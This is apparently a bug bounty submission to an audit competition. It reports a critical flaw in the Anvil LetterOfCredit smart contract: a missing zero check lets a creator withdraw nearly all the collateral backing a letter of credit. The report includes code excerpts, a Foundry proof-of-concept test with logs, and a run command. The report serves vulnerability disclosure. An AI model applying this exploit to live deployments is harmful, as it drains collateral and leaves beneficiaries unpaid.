# #36931 \[SC-Critical] critical creators can modifyloccollateral of dynamic loc to release ....

## #36931 \[SC-Critical] Creators can modifyLOCCollateral of dynamic LOC to release almost all the collateral of LOC

**Submitted on Nov 20th 2024 at 05:08:07 UTC by @perseverance for** [**Audit Comp | Anvil: Letters of Credit**](https://immunefi.com/audit-competition/audit-comp-anvil-letters-of-credit)

* **Report ID:** #36931
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/AcronymFoundation/anvil-contracts/blob/main/contracts/LetterOfCredit.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Protocol insolvency

### Description

## Description

### Brief/Intro

[As the documents of Anvil](https://docs.anvil.xyz/protocol-concepts/letter-of-credit)

A Letter of Credit (LOC) is a contractual agreement that guarantees payment on time and in full from a buyer (creator) to a seller (beneficiary). The Anvil LOC comprises two elements: the collateral asset, which secures the LOC, and the credited asset, representing its redeemable value. The protocol supports LOC issuance irrespective of the collateral and credit asset types.

**The critical aspect of every LOC is the redeemability of its full credited value. To mitigate potential market volatility all LOCs require sufficient overcollateralization. Liquidity must be available for collateral-asset-to-credited-asset conversion, guaranteeing beneficiaries invariably receive the credited asset.**

**It is important that all LOCs require sufficient overcollateralization.**

The beneficiary or seller can based on the creditTokenAmount to sell the buyer something based on this LOC. The Credited amount is guaranteed to be backed by collateral that is worth more than the credited amount. The buy and sell activity is managed outside of the LetterOfCredit contract.

Users can create the Dynamic LOC by using function createDynamicLOC.

For example for the pair WETH and USDC, this creationCollateralFactorBasisPoints can be 6500 that is 65% so that the credited amount should be less than 65% of the collateral. This is to ensure that the all LOCs require **sufficient overcollateralization.**

Also the creators of the LOC can modify the collateral by calling **modifyLOCCollateral** to add or releaserelease the collateral, but still need to have the **sufficient overcollateralization**.

### The vulnerability

#### Vulnerability Details

The vulnerability here is in the function modifyLOCCollateral **does not check if the cfBasisPoints is 0**

\`\`\`solidity function modifyLOCCollateral( uint96 \_locId, int256 \_byAmount, bytes calldata \_oraclePriceUpdate, bytes calldata \_collateralizableAllowanceSignature ) external payable refundExcess nonReentrant { LOC memory loc = locs\[\_locId];

```
    // Removed for simplicity

    if (_byAmount &lt;&#x3D; 0) {
        if (uint256(-_byAmount) &gt;&#x3D; loc.collateralTokenAmount)
            revert InsufficientCollateral(uint256(_byAmount), loc.collateralTokenAmount);

        uint256 requiredCollateralFactorBasisPoints &#x3D; collateralToCreditedToCollateralFactors[
            loc.collateralTokenAddress
        ][loc.creditedTokenAddress].creationCollateralFactorBasisPoints;
        if (requiredCollateralFactorBasisPoints &#x3D;&#x3D; 0)
            revert AssetPairUnauthorized(loc.collateralTokenAddress, loc.creditedTokenAddress);

        Pricing.OraclePrice memory price;
       

        uint16 cfBasisPoints &#x3D; Pricing.collateralFactorInBasisPoints(
            newCollateralAmount,
            loc.creditedTokenAmount,
            price
        );
        if (cfBasisPoints &gt; requiredCollateralFactorBasisPoints) // @audit-issue does not check if cfBasisPoints is 0 
            revert InsufficientCollateral(requiredCollateralFactorBasisPoints, cfBasisPoints);
    }

    // Update storage.
    locs[_locId].collateralTokenAmount &#x3D; newCollateralAmount;
    locs[_locId].claimableCollateral &#x3D; newClaimableAmount;

    emit LOCCollateralModified(_locId, loc.collateralTokenAmount, newCollateralAmount, newClaimableAmount);
}
```

\`\`\`

Here if the newCollateralAmount is very small, then cfBasisPoints might be 0 because the **collateralInCredited is 0**

\`\`\`solidity function collateralFactorInBasisPoints( uint256 \_collateralTokenAmount, uint256 \_creditedTokenAmount, OraclePrice memory \_price ) internal pure returns (uint16) { uint256 collateralInCredited = collateralAmountInCreditedToken(\_collateralTokenAmount, \_price); // Don't divide by 0 if (collateralInCredited == 0) { return 0; } return uint16((\_creditedTokenAmount \* 10\_000) / collateralInCredited); } \`\`\`

So the creators can modifyCollateral to withdraw almost all the collateral. By exploiting this bug, the attacker breaks the stability of the system. The system is severely **under collateralized** and this can make the Protocol Insolvency scenario.

The attacker can modify the LOC and back the Credited Amount with with very small amount of collateral. This will result in victim loss of funds.

By exploiting this bug, the attacker can also create a lot of dynamic LOC with small collateral and can make creditedTokens\[\_creditedTokenAddress].globalAmountInDynamicUse equal or nearly equal to creditedToken.globalMaxInDynamicUse so other users of the protocol will not be able to create the dynamic LOC. Because users's call to function will failed in createDynamicLOC because of this check

\`\`\`solidity function \_validateAndUpdateCreditedTokenUsageForDynamicLOCCreation( address \_creditedTokenAddress, uint256 \_creditedTokenAmount ) private { CreditedToken memory creditedToken = creditedTokens\[\_creditedTokenAddress]; // ... uint256 newCreditedAmountInUse = creditedToken.globalAmountInDynamicUse + \_creditedTokenAmount; if (newCreditedAmountInUse > creditedToken.globalMaxInDynamicUse) revert GlobalCreditedTokenMaxInUseExceeded(creditedToken.globalMaxInDynamicUse, newCreditedAmountInUse);

```
    creditedTokens[_creditedTokenAddress].globalAmountInDynamicUse &#x3D; newCreditedAmountInUse;
}
```

\`\`\`

## Impacts

## About the severity assessment

Bug Severity: Critical

Impact category:

Protocol insolvency

Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

Difficulty of the attack: Easy

It is easy to automate the attack

### Link to Proof of Concept

<https://gist.github.com/Perseverancesuccess2021/831d502296049011991a7af9afe31abc#file-testletterofcredit-sol>

### Proof of Concept

## Proof of concept

Steps to execute the attack:

Step 1: Attacker create a dynamicLOC for the victim with over-collaterized amount of collateral

Step 2: Attacker call modifyLOCCollateral to release almost all the collateral

Test code to show: <https://gist.github.com/Perseverancesuccess2021/831d502296049011991a7af9afe31abc#file-testletterofcredit-sol>

\`\`\`solidity function testModifyLOCCollateral() public {\
setup\_precondition();

```
    CollateralVault.CollateralBalance  memory balance &#x3D; CollateralVault(CollateralVault_contract).getAccountCollateralBalance(attacker, WETH); 
    assertEq(balance.available, 10**18);
    assertEq(balance.reserved, 0);

    uint96 loc_id &#x3D; createDynamicLOC(); 
    console.log(&quot;Loc id&quot;); 
    console.log(loc_id); 
    balance &#x3D; CollateralVault(CollateralVault_contract).getAccountCollateralBalance(attacker, WETH); 
    assertEq(balance.available, 0);
    assertEq(balance.reserved, 10**18);
    

    LetterOfCredit.LOC memory _loc &#x3D; LetterOfCredit(LetterOfCredit_proxy).getLOC(loc_id);
    console.log(&quot;LOC Details: collateralTokenAddress &quot;, _loc.collateralTokenAddress);
    console.log(&quot;LOC Details: collateralTokenAmount &quot;, _loc.collateralTokenAmount);
    console.log(&quot;LOC Details: creditedTokenAddress &quot;, _loc.creditedTokenAddress);
    console.log(&quot;LOC Details: creditedTokenAmount &quot;, _loc.creditedTokenAmount);

    bytes memory _oraclePriceUpdate &#x3D;  &quot;&quot;;
    bytes memory signature_  &#x3D; &quot;&quot;; 
          
    int256 amount_1 &#x3D; int256(_loc.collateralTokenAmount - 2) * (-1); 


    console.log(&quot;Attacker to modify the collateral of the LOC&quot;);
    vm.startPrank(attacker);
    LetterOfCredit(LetterOfCredit_proxy).modifyLOCCollateral(loc_id, amount_1,_oraclePriceUpdate , signature_ ); 
    vm.stopPrank();

    _loc &#x3D; LetterOfCredit(LetterOfCredit_proxy).getLOC(loc_id);
    console.log(&quot;After attack: LOC Details: collateralTokenAddress &quot;, _loc.collateralTokenAddress);
    console.log(&quot;After attack:  LOC Details: collateralTokenAmount &quot;, _loc.collateralTokenAmount);
    console.log(&quot;After attack:  LOC Details: creditedTokenAddress &quot;, _loc.creditedTokenAddress);
    console.log(&quot;After attack:  LOC Details: creditedTokenAmount &quot;, _loc.creditedTokenAmount);
    balance &#x3D; CollateralVault(CollateralVault_contract).getAccountCollateralBalance(attacker, WETH);
    
    assertEq(balance.available, 999999999999999998);
    assertEq(balance.reserved, 2);
    console.log(&quot;After attack: Balance of WETH for attacker: available&quot;, balance.available); 
    console.log(&quot;After attack: Reserved of WETH for attacker: reserved &quot;, balance.reserved);


}    

function createDynamicLOC() public  returns (uint96 loc_id) {

    console.log(&quot;Attacker to create a dynamic LOC for victim&quot;); 
    address _beneficiary &#x3D; user;                 
    address _collateralTokenAddress &#x3D; WETH; 
    uint256 _collateralTokenAmount &#x3D; 10**18;  // 1 WETH  &#x3D; 3000 USDC  
    address _creditedTokenAddress &#x3D; USDC;
    uint256 _creditedTokenAmount  &#x3D; 1_900*10**6; // 1900 USDC         
    uint32 _expirationTimestamp &#x3D; uint32(block.timestamp + 43200000); 
    bytes memory signature_ &#x3D; CreateSignature(PrivateKey_2, _collateralTokenAmount, WETH, attacker_nonce++);
    bytes memory _oraclePriceUpdate &#x3D;  &quot;&quot;;
    mockPriceReturnData();        
    vm.startPrank(attacker);
    loc_id &#x3D; LetterOfCredit(LetterOfCredit_proxy).createDynamicLOC(_beneficiary, _collateralTokenAddress, _collateralTokenAmount, _creditedTokenAddress,_creditedTokenAmount, _expirationTimestamp, _oraclePriceUpdate, signature_);  
    vm.stopPrank(); 
     

}
```

\`\`\`

Explanation:

The price of WETH is 3000 USDC

For this POC, the creator created the LOC with 1 WETH and the credit amount 1900 USDC

Then the creator (attacker) modify the collateral of the LOC to withdraw almost all WETH, just left 2 wei in the LOC, but still backs the CreditedTOken amount of 1900 USDC

Log: <https://gist.github.com/Perseverancesuccess2021/831d502296049011991a7af9afe31abc#file-testmodifyloccollateral\\_241120\\_1040-log>

\`\`\`Log Ran 1 test for test/testLetterOfCredit.sol:testLetterOfCredit \[PASS] testModifyLOCCollateral() (gas: 7835812) Logs: Setup Precondition for the test case Deploying LetterOfCredit Proxy contract that is VisibleBeaconProxy points to LetterOfCredit Initialize LetterOfCredit contract Approve the LetterOfCredit\_proxy as the collateralizable contract Balance of token before depositing: 1000000000000000000 Approve the CollateralVault\_contract to spend token to deposit Step: Deposit token to CollateralVault for the user Attacker to create a dynamic LOC for victim Mock Price Update for WETH/USDC Mock Price Update for WETH/USDC that is about 3000 USDC for 1 WETH Loc id 1 LOC Details: collateralTokenAddress 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 LOC Details: collateralTokenAmount 1000000000000000000 LOC Details: creditedTokenAddress 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 LOC Details: creditedTokenAmount 1900000000 Attacker to modify the collateral of the LOC After attack: LOC Details: collateralTokenAddress 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 After attack: LOC Details: collateralTokenAmount 2 After attack: LOC Details: creditedTokenAddress 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 After attack: LOC Details: creditedTokenAmount 1900000000 After attack: Balance of WETH for attacker: available 999999999999999998 After attack: Reserved of WETH for attacker: reserved 2

\`\`\`

Just download the zip file:

<https://drive.google.com/file/d/1lKnqYK1Uk8Yp70CDTM\\_1-J3yzx5Vjbb9/view?usp=sharing>

The test code uses Foundry. Just Unzip and run the test case:

\`\`\`bash forge test --match-test testModifyLOCCollateral -vvvvv

\`\`\`
